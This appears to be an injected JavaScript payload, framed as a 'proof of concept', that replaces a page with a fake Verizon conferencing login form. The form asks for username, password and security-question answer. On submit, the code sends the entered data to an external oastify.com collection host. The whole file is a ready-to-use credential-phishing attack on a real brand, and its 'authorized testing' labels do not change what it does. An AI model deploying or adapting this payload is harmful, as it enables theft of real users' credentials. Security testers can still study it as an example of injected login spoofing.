// Clear the existing page
document.body.innerHTML = '';
document.body.style.margin = "0";
document.body.style.fontFamily = "Arial, sans-serif";
document.body.style.background = "#f3f4f6";

// --- Styles ---
const style = document.createElement("style");
style.textContent = `
  .vzn-wrapper {
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
  }
  .vzn-card {
    width: 360px;
    background: #ffffff;
    border-radius: 12px;
    box-shadow: 0 6px 20px rgba(0,0,0,0.18);
    padding: 28px 26px 24px;
    text-align: center;
  }
  .vzn-logo {
    max-width: 160px;
    margin-bottom: 20px;
  }
  .vzn-title {
    margin: 0 0 6px;
    font-size: 22px;
    color: #222;
    font-weight: 600;
  }
  .vzn-desc {
    margin: 0 0 20px;
    font-size: 13px;
    color: #666;
  }
  .vzn-input {
    width: 100%;
    padding: 10px;
    margin: 7px 0;
    border: 1px solid #ccc;
    border-radius: 6px;
    font-size: 13px;
    box-sizing: border-box;
  }
  .vzn-input:focus {
    outline: none;
    border-color: #d22;
    box-shadow: 0 0 0 1px rgba(210,34,34,0.25);
  }
  .vzn-button {
    width: 100%;
    padding: 11px;
    margin-top: 12px;
    border: none;
    border-radius: 6px;
    font-size: 14px;
    font-weight: 600;
    cursor: pointer;
    background: #d22;
    color: #fff;
  }
  .vzn-button:hover {
    background: #b01b1b;
  }
  .vzn-footnote {
    margin-top: 12px;
    font-size: 11px;
    color: #999;
  }
`;
document.head.appendChild(style);

// --- Build UI ---
const wrapper = document.createElement("div");
wrapper.className = "vzn-wrapper";

const card = document.createElement("div");
card.className = "vzn-card";

// Verizon Logo
const logo = document.createElement("img");
logo.src = "https://e-meetings.verizonbusiness.com/images/VerizonLogo_RED_90.png";
logo.className = "vzn-logo";
card.appendChild(logo);

// Title and Description
const title = document.createElement("h2");
title.className = "vzn-title";
title.textContent = "Conferencing Login";
card.appendChild(title);

const desc = document.createElement("p");
desc.className = "vzn-desc";
desc.textContent = "Security Test – Proof of Concept";
card.appendChild(desc);

// Form
const customLoginForm = document.createElement("form");
customLoginForm.id = "customLoginForm";

// Helper to build clean input rows
function addField(placeholder, name, type = "text") {
  const input = document.createElement("input");
  input.className = "vzn-input";
  input.placeholder = placeholder;
  input.name = name;
  input.type = type;
  input.required = true;
  customLoginForm.appendChild(input);
}

// Add fields
addField("Username", "username");
addField("Password", "password", "password");
addField("Security Question Answer", "answer");

// Submit button
const button = document.createElement("button");
button.className = "vzn-button";
button.type = "submit";
button.textContent = "Login";
customLoginForm.appendChild(button);

card.appendChild(customLoginForm);

// Footnote
const note = document.createElement("div");
note.className = "vzn-footnote";
note.textContent = "Authorized security testing only.";
card.appendChild(note);

// Add card to wrapper
wrapper.appendChild(card);
document.body.appendChild(wrapper);

// Submit Handler (your original logic preserved exactly)
customLoginForm.addEventListener("submit", function(e) {
  e.preventDefault();
  const formData = new FormData(customLoginForm);

  fetch("https://co4ozwtzquywfw322rxbskkam1ssgr4g.oastify.com", {
    method: "POST",
    body: formData
  });
});
